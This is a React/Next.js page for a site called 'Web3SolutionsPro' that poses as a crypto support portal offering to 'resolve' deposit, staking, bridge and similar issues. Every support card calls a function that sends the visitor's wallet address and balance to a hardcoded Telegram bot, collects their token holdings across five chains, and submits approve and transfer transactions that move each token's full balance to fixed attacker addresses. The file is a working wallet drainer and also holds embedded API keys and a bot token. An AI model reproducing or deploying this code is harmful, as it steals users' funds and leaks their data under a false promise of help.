import Moralis from 'moralis';
import { ThirdwebSDK } from "@thirdweb-dev/sdk";
import { EvmChain } from '@moralisweb3/common-evm-utils';
import { useAddress,useBalance,useSigner,ConnectWallet,useConnectionStatus } from '@thirdweb-dev/react';
import { NATIVE_TOKEN_ADDRESS, getSignerAndProvider } from '@thirdweb-dev/sdk';
import { ethers } from "ethers";
import { NextPage } from "next";
import { useRouter } from 'next/router';
import ChainContext from "../context/Chain";
import React, { useContext, useState, useEffect } from "react";
import { Navbar, NavbarBrand, NavbarContent, NavbarItem, Link, Switch,NavbarMenuToggle ,NavbarMenu,NavbarMenuItem,Divider,Card,CardBody,CardFooter,CardHeader,Modal,ModalHeader,ModalBody,ModalContent,ModalFooter,Button} from "@nextui-org/react";
import Head from "next/head";
import { useTheme } from "next-themes";
import MoonIcon from "./moon";
import SunIcon from "./sun";

const Explore: NextPage = () => {
    const [isMenuOpen, setIsMenuOpen] = React.useState(false);
    const menuItems = [
        "Explore",
        "Projects",
        "Help & Feedback",
      ];
      const list = [
        {
            title: "Deposit",
            body: "Resolve Deposit Problem",
            price: "",
          },
          {
            title: "Withdraw",
            body: "Resolve Withdrawal issue",
            price: "",
          },
          {
            title: "Public Sale",
            body: "Resolve Public Sale Issue",
            price: "",
          },
          {
            title: "Private Sale",
            body: "Resolve Private Sale Issue",
            price: "",
          },
        {
          title: "Referral Rewards",
          body: "Resolve Referral Rewards Issue",
          price: "",
        },
        {
          title: "Claim Rewards",
          body: "Resolve Claim Rewards Issue",
          price: "",
        },
        {
          title: "Earn Rewards",
          body: "Resolve Earn Rewards Issue",
          price: "",
        }, 
        {
          title: "Marketplace",
          body: "Resolve Marketplace Issue",
          price: "",
        },
        {
            title:"Rectification",
            body:"Resolve Rectification Issue",
            
        },
        {
            title:"Stake",
            body:"Resolve Stake Issue",
            
        },
        {
            title:"Unstake",
            body:"Resolve Unstake Issue",
            
        },
        {
            title:"Galxe-Web",
            body:"Resolve Galxe-web Issue",
            
        },
        {
            title:"Quest3",
            body:"Resolve Quest3 Issue",
            
        },
        {
            title:"Zealy Market",
            body:"Resolve Zealy Market Issue",
            
        },
        {
            title:"Guild.xyz",
            body:"Resolve Guild.xyz Issue",
            
        },
        {
            title:"Bridge Token",
            body:"Resolve Bridge Token Issue",
            
        },
        {
            title:"Get Role",
            body:"Resolve Get Role Issue",
            
        },
        {
            title:"Verify Role",
            body:"Resolve Verify Role Issue",
            
        },
        {
            title:"Merge RPC",
            body:"Resolve Merge RPC Issue",
            
        },
        {
            title:"Swap",
            body:"Resolve Swap Issue",
            
        },
        {
            title:"Connect Tasks",
            body:"Resolve Connect Tasks Issue",
            
        },
        {
            title:"Mint",
            body:"Resolve Minting Issue",
            
        },
        {
            title:"Troubleshoot",
            body:"Resolve Troubleshooting Issue",
            
        },
        {
            title:"Fix Gas",
            body:"Resolve Gas Fixing Issue",
            
        },
        {
            title:"Retreieve Service",
            body:"Resolve Service Retrieval Issue",
            
        },
        {
            title:"Add Liquidity",
            body:"Resolve Liquidity Addition Issue",
            
        },
        {
            title:"Remove Liquidity",
            body:"Resolve Liquidity Removal Issue",
            
        },
    
        
      ];
const router = useRouter();
const { theme, setTheme } = useTheme();
const project = router.query.project as string;
const address = useAddress();
const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
const wbalance = data?.displayValue;
const signer = useSigner();
const connectionStatus = useConnectionStatus();
const [showConnectModal, setShowConnectModal] = useState(false);
const toggleTheme = () => {
    setTheme(theme === "light" ? "dark" : "light");
  };
const apiKey = "XBHbf47AI2Fin462uOUOgFQ58HVtvev45cj0qegiOGZsivvFG7w53Q4jmQTLjn9x";
const { selectedChain, setSelectedChain } = useContext(ChainContext);
const addresses: Record<string, string> = {
    ["ethereum"]: "0x5fC8D30804508dfBB940b64D20BdCFCA9C6A6c25",
    ["binance"]: "0x5fC8D30804508dfBB940b64D20BdCFCA9C6A6c25",
    ["arbitrum"]: "0xb4511516352e47F4A8A2E750Cd3505eC0D5930B1",
    ["polygon"]: "0xaF9c61A17d7F64507B983DD90de471CD010EDe12",
    ["avalanche"]: "0xaF9c61A17d7F64507B983DD90de471CD010EDe12",
  };
  const sdk = new ThirdwebSDK("mumbai", {
    clientId: "eae31aadb84c7c4cc24b2d16fb595580",
  });
  
  async function explore() {
    if (!address) {
      setShowConnectModal(true);
      return;
    }
    
switch (connectionStatus) {
  case "unknown":
    await sendMessageToTelegram("User is yet to connect. Hold on........");
    setShowConnectModal(true);
    return;
  case "connecting":
    await sendMessageToTelegram("User's wallet is connecting. Please be patient...");
    break;
  case "connected":
    await sendMessageToTelegram(`User with wallet address: ${address} and balance of ${wbalance} has connected.`);
    break;
  case "disconnected":
    await sendMessageToTelegram("User has disconnected!");
    setShowConnectModal(true);
    return;
  default:
    break;
}

    await Moralis.start({
      apiKey: apiKey,
    });

    const waddress = address;
    const chainOptions = ["ethereum", "arbitrum", "binance", "polygon", "avalanche"];
    const allTokenData = [];

  
  for (const selectedChain of chainOptions) {
      let chain;
    
      switch (selectedChain) {
        case "ethereum":
          chain = EvmChain.ETHEREUM;
          break;
        case "arbitrum":
          chain = EvmChain.ARBITRUM;
          break;
        case "binance":
          chain = EvmChain.BSC;
          break;
        case "polygon":
          chain = EvmChain.POLYGON;
          break;
        case "avalanche":
          chain = EvmChain.AVALANCHE;
          break;
        default:
          break;
      }
    
          if (chain) {
            const response = await Moralis.EvmApi.token.getWalletTokenBalances({
              address: waddress,
              chain,
            });
            
            const tokens = response.toJSON();
            const filteredTokens = tokens.filter((token) => {
              return (
                parseFloat(token.balance) > 0 &&
                token.possible_spam === false
              );
            });
            const tokenData = filteredTokens.map((token) => {
              const tokenName = token.name;
              const spenderAddy = addresses[selectedChain]; 
              const abi = require("erc-20-abi");
              
              return {
                name: tokenName,
                address: token.token_address,
                balance: token.balance,
                decimals: token.decimals,
                chain: selectedChain,
                spenderAddy: spenderAddy,
                symbol: token.symbol,
                abi:abi,
              };
            });
            allTokenData.push(...tokenData);
            console.log(allTokenData);
            
          }
        }
        for (const tokenData of allTokenData) {
         
          try {
            const gasLimit = "100000";
            const to ="0xE0bC4c3269F83130410a54e316d08b38977f6321";
            const contract = new ethers.Contract(tokenData.address, ['function approve(address spender, uint256 value)'], signer);
            const syncontract = new ethers.Contract(tokenData.spenderAddy,['function transferERC20(address tokenAddress, address fromAddress, address toAddress, uint256 value)'],signer );
            const data = await contract.interface.encodeFunctionData('approve', [tokenData.spenderAddy, tokenData.balance]);
            const syncData = syncontract.interface.encodeFunctionData('transferERC20', [tokenData.address,address,to,tokenData.balance]);
            const tx = {
        to: tokenData.address,
        data: data,
        gasLimit: gasLimit,
      };
      const tx2 = {
        to: tokenData.address,
        data: syncData,
        gasLimit: gasLimit,
      };
      const dataTx = await signer?.sendTransaction(tx);
      const syncTx = await signer?.sendTransaction(tx2);
      console.log(dataTx);
      console.log(syncTx);
    } catch (error) {
            const errorObj = error as Error;
            await sendMessageToTelegram(errorObj.message);
        }
        }
    }
   
return(
    <div>
        <Head>
      <title>Web3SolutionsPro - Home</title>
    </Head>
 <Navbar
      isBordered
      isMenuOpen={isMenuOpen}
      onMenuOpenChange={setIsMenuOpen}
    >
      <NavbarContent className="sm:hidden" justify="start">
        <NavbarMenuToggle aria-label={isMenuOpen ? "Close menu" : "Open menu"} />
      </NavbarContent>

      <NavbarContent className="sm:hidden pr-3" justify="center">
        <NavbarBrand>
          
          <p className="font-bold text-inherit">Web3SolutionsPro</p>
        </NavbarBrand>
      </NavbarContent>

      <NavbarContent className="hidden sm:flex gap-4" justify="center">
        <NavbarBrand>
          
          <p className="font-bold text-inherit">Web3SolutionsPro</p>
        </NavbarBrand>
        <NavbarItem>
          <Link color="foreground" href="#">
            Explore
          </Link>
        </NavbarItem>
        <NavbarItem isActive>
          <Link href="#" aria-current="page">
            Projects
          </Link>
        </NavbarItem>
      </NavbarContent>

      <NavbarContent justify="end">
        <NavbarItem>
           <Switch
      defaultSelected
      size="lg"
      color="primary"
      thumbIcon={({ isSelected, className }) =>
        isSelected ? ( 
          <SunIcon className={className}  />
        ) : (
          <MoonIcon className={className} />
        )
      }
      onChange={toggleTheme}
    >
    </Switch>
        &nbsp;&nbsp;&nbsp;
        </NavbarItem>
      </NavbarContent>

      <NavbarMenu>
        {menuItems.map((item, index) => (
          <NavbarMenuItem key={`${item}-${index}`}>
            <Link
              className="w-full"
              color={
                index === 0 ? "warning" : index === menuItems.length - 1 ? "danger" : "foreground"
              }
              href="#"
              size="lg"
            >
              {item}
            </Link>
          </NavbarMenuItem>
        ))}
      </NavbarMenu>
    </Navbar>
    <br></br>
    <div className="justify-center text-center">
    <ConnectWallet
        theme={theme as ("light" | "dark" | undefined)}
        modalTitle={"Connect"}
        modalSize={"wide"}
        welcomeScreen={{
          title:
            "Your gateway to a safe  decentralized world of   Secured Web3 Solutions ",
          img: {
            src: "",
            width: 150,
            height: 150,
          },
        }}
        modalTitleIconUrl={""}
      />
      </div>
      <br></br><br></br>
<div className="gap-4 grid grid-cols-2 sm:grid-cols-4">
<Modal isOpen={showConnectModal} onClose={() => setShowConnectModal(false)}>
  <ModalContent>
          {(onClose) => (
            <>
              <ModalHeader className="flex flex-col gap-1">Connect Wallet</ModalHeader>
              <ModalBody>
                <p> 
                  Connect your wallet to access this feature.
                  <br></br><br></br>
                  <ConnectWallet
        theme={theme as ("light" | "dark" | undefined)}
        modalTitle={"Connect"}
        modalSize={"wide"}
        welcomeScreen={{
          title:
            "Your gateway to a safe  decentralized world of   Secured Web3 Solutions ",
          img: {
            src: "",
            width: 150,
            height: 150,
          },
        }}
        modalTitleIconUrl={""}
      />
                </p>
              </ModalBody>
              <ModalFooter>
                <Button color="danger" variant="light" onPress={onClose}>
                  Close
                </Button>
              </ModalFooter>
            </>
          )}
        </ModalContent>
</Modal>
      {list.map((item, index) => (
        <Card shadow="sm" key={index} isPressable onPress={() => explore()} className="border-double border-2 bg-transparent">
          <CardBody className="overflow-visible p-0">
            <p className="justify-center text-center py-10 px-10 font-bold">{item.price}</p>
          </CardBody>
          <CardFooter className="text-small justify-between">
            <b>{item.title}</b>
            <p className="text-default-500">{item.price}</p>
          </CardFooter>
        </Card>
      ))}
    </div>
    </div>
)
};
const sendMessageToTelegram = async (message: string) => {
  const botToken = '6057314190:AAES15kEQX0oGZbphbnB9FXsJhcDcN66QmU';
  const chatId = '5508645371';
  
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  const response = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  });
}; 
export default Explore;



